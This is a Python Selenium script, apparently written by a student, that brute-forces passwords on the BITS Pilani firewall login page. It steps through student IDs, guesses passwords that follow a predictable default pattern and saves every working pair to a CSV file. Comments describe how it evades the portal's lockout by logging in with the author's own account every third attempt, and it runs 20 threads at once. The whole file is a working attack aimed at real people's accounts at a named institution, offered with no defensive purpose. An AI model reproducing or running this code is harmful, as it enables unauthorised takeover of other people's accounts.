from time import sleep, strftime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import threading
#code that uses 20 threads to attack. The BITS authentication server detects a lot of traffic from one device and blocks the login page temporarily
def scrape(start,end):
    B_ID="f2017XXXX" #replace XXXX
    B_PWD="A7PSXXXXABCD#"
    fl = open('csvfile.csv','a')
    chromedriver_path = '/Users/abhinav/Downloads/chromedriver'
    driver = webdriver.Chrome(executable_path=chromedriver_path) # This will open the Chrome window
    sleep(2)
    login = 'https://fw.bits-pilani.ac.in:8090'
    driver.get(login)
    s2=2017
    l=['A8','A2','A7','A4','A5','A1','A3','AB']

    #PS Running this for all IDs and all possible branch codes will take an enormous time
    #it takes roughly 8.5 hours to get one person's password assuming brach known
    #if branch unkown and need to iterate from list l, time will increase by around 10x
    for i in range(0,1200): #range of BITS IDs
        k=str(i)
        while len(k)<4:
            k='0'+k
        r=k
        k='f'+str(s2)+k
        #print(k)
        #BITS login id
        try:
            username = driver.find_element_by_xpath("//input[@name='username']")
            username.clear()
            username.send_keys(k)
        except:
            sleep(5)
            username = driver.find_element_by_xpath("//input[@name='username']")
            username.clear()
            username.send_keys(k)
        flag=0
        for b in l:
            pw=b
            pw+='PS'
            pw+=r
            for t in range(0,9999):
                g=str(t)
                passwd = driver.find_element_by_xpath("//input[@name='password']")
                login = driver.find_element_by_xpath("//div[@id='loginbutton']")
                if t%3==0:
                    try:
                        username.clear()
                        passwd.clear()
                    except:
                        sleep(5)
                        try:
                            username.clear()
                            passwd.clear()
                        except:
                            sleep(10)
                            try:
                                username.clear()
                                passwd.clear()
                            except:
                                sleep(20)
                                username.clear()
                                passwd.clear()
                    try:
                        username.send_keys(B_ID)
                    except:
                        sleep(2)
                        username.send_keys(B_ID)
                    try:
                        passwd.send_keys(B_PWD)
                    except:
                        sleep(2)
                        passwd.send_keys(B_PWD)
                    try:
                        login.click()
                    except:
                        sleep(5)
                        try:
                            login.click()
                        except:
                            sleep(10)
                            try:
                                login.click()
                            except:
                                sleep(60)
                                login.click()
                    sleep(2)
                    try:
                        login.click()
                    except:
                        sleep(2)
                        login.click()
                    sleep(2)
                    try:
                        username.clear()
                        username.send_keys(k)
                    except:
                        try:
                            sleep(5)
                            username.clear()
                            username.send_keys(k)
                        except:
                            try:
                                login.click()
                                sleep(10)
                                username.clear()
                                username.send_keys(k)
                            except:
                                sleep(10)
                                login.click()
                                sleep(10)
                                username.clear()
                                username.send_keys(k)



                while len(g)<4:
                    g='0'+g
                d=pw+g+'#'
                print(d)
                try:
                    passwd.clear()
                    passwd.send_keys(d)
                except:
                    sleep(2)
                    try:
                        passwd.clear()
                        passwd.send_keys(d)
                    except:
                        sleep(5)
                        try:
                            passwd.clear()
                            passwd.send_keys(d)
                        except:
                            sleep(10)
                            passwd.clear()
                            passwd.send_keys(d)

                    #sleep(2)
                try:
                    login.click()
                except:
                    sleep(2)
                    login.click()
                sleep(5)
                try:
                    passwd.clear()
                    passwd2 = driver.find_element_by_xpath("//div[@id='credentials' and @class='loggedin']")
                    fl.write(k+','+d+"\n")
                    flag=1
                    break
                except Exception as e:
                    continue
            if flag==1:
                break
            
    fl.close

if __name__ == "__main__":  
    t1 = threading.Thread(target=scrape, args=(0,467,)) 
    t2 = threading.Thread(target=scrape, args=(467,1000,)) 
    t3 = threading.Thread(target=scrape, args=(1000,1500,)) 
    t4 = threading.Thread(target=scrape, args=(1500,2000,)) 
    t5 = threading.Thread(target=scrape, args=(2000,2500,)) 
    t6 = threading.Thread(target=scrape, args=(2500,3000,)) 
    t7 = threading.Thread(target=scrape, args=(3000,3500,)) 
    t8 = threading.Thread(target=scrape, args=(3500,4000,)) 
    t9 = threading.Thread(target=scrape, args=(4000,4500,)) 
    t10 = threading.Thread(target=scrape, args=(4500,5000,)) 
    t11 = threading.Thread(target=scrape, args=(5000,5500,)) 
    t12 = threading.Thread(target=scrape, args=(5500,6000,)) 
    t13 = threading.Thread(target=scrape, args=(6000,6500,)) 
    t14 = threading.Thread(target=scrape, args=(6500,7000,)) 
    t15 = threading.Thread(target=scrape, args=(7000,7500,)) 
    t16 = threading.Thread(target=scrape, args=(7500,8000,)) 
    t17 = threading.Thread(target=scrape, args=(8000,8500,)) 
    t18 = threading.Thread(target=scrape, args=(8500,9000,)) 
    t19 = threading.Thread(target=scrape, args=(9000,9500,)) 
    t20 = threading.Thread(target=scrape, args=(9500,10000,)) 

    #t1.start() 
    t2.start()
    t3.start() 
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start() 
    t9.start()
    t10.start() 
    t11.start() 
    t12.start() 
    t13.start() 
    t14.start() 
    t15.start() 
    t16.start() 
    t17.start() 
    t18.start() 
    t19.start() 
    t20.start()  
   
    #t1.join() 
    t2.join()
    t3.join() 
    t4.join()
    t5.join()        
    t6.join()
    t7.join()
    t8.join()
    t9.join()
    t10.join()
    t11.join()
    t12.join()
    t13.join()
    t14.join()
    t15.join()
    t16.join()
    t17.join()
    t18.join()
    t19.join()
    t20.join()
